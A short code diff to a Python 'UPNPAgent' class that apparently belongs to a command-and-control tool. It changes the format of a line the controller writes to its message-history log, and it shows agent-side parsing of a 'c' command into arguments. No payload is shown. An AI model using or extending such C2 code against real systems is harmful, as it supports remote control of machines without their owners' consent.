@@ -112,7 +112,7 @@ class UPNPAgent:
         if self.is_c2:
             if agent_ip in self.agents:
                 print(f"MESSAGE {agent_ip}: {message_content}")
-                open('message_history.txt', 'a+', encoding='utf8').write(f"{agent_ip}:{message_index} -> {message_content}\n")
+                open('message_history.txt', 'a+', encoding='utf8').write(f"{agent_ip} -> {message_content}\n")
         elif not self.is_c2:
             if command == ord('c'):
                 command_args = message_content.decode('utf8').split()
